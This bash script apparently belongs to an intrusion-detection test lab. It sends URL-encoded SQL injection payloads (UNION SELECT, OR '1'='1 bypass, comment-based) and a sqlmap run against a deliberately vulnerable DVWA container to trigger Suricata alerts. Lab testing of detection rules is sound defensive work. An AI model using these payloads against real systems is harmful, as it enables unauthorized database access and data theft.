#!/bin/bash
# =============================================================================
# Attack Script 2: SQL Injection Attack
# =============================================================================
# This script sends SQL injection payloads to the DVWA vulnerable web app.
# Suricata has built-in rules to detect SQL injection attempts.
#
# Usage (from attacker container):
#   ./attack-scripts/attack-sql.sh
#
# Or from host:
#   docker compose -f docker-compose.yml exec attacker /attack-scripts/attack-sql.sh
# =============================================================================

set -e

# Configuration
VICTIM_IP="${VICTIM_IP:-10.10.10.4}"

echo "[*] ================================================"
echo "[*] NetSentry IDPS Test - SQL Injection Attack"
echo "[*] ================================================"
echo "[*] Target: http://$VICTIM_IP"
echo "[*] ================================================"

# Wait for DVWA to be ready
echo "[*] Checking if DVWA is ready..."
for i in {1..30}; do
    if curl -s -o /dev/null -w "%{http_code}" "http://$VICTIM_IP/setup.php" | grep -q "200"; then
        echo "[*] DVWA is ready!"
        break
    fi
    echo "[*] Waiting for DVWA... ($i/30)"
    sleep 2
done

# SQL Injection Test 1: Basic UNION-based
echo ""
echo "[*] Test 1: Basic UNION SELECT injection..."
curl -s "http://$VICTIM_IP/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%201,2,3--%20&Submit=Submit" | grep -i "error\|sql\|warning" || true

# SQL Injection Test 2: OR-based authentication bypass
echo "[*] Test 2: OR-based authentication bypass..."
curl -s "http://$VICTIM_IP/vulnerabilities/sqli/?id=%27%20OR%20%271%27%3D%271&Submit=Submit" | grep -i "error\|sql\|warning" || true

# SQL Injection Test 3: Comment-based
echo "[*] Test 3: Comment-based injection..."
curl -s "http://$VICTIM_IP/vulnerabilities/sqli/?id=%27%20OR%20%27%27%3D%27&Submit=Submit" | grep -i "error\|sql\|warning" || true

# SQL Injection Test 4: Using sqlmap
echo ""
echo "[*] Test 4: Running sqlmap fingerprint..."
sqlmap -u "http://$VICTIM_IP/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=1 --risk=1 2>&1 | head -50 || true

echo ""
echo "[*] ================================================"
echo "[*] SQL Injection tests complete."
echo "[*] Check Suricata eve.json for alerts."
echo "[*] Expected alerts:"
echo "[*]   - ET WEB_ATTACK SQL INJECTION"
echo "[*]   - ET POLICY SQL Injection Attempt"
echo "[*] ================================================"
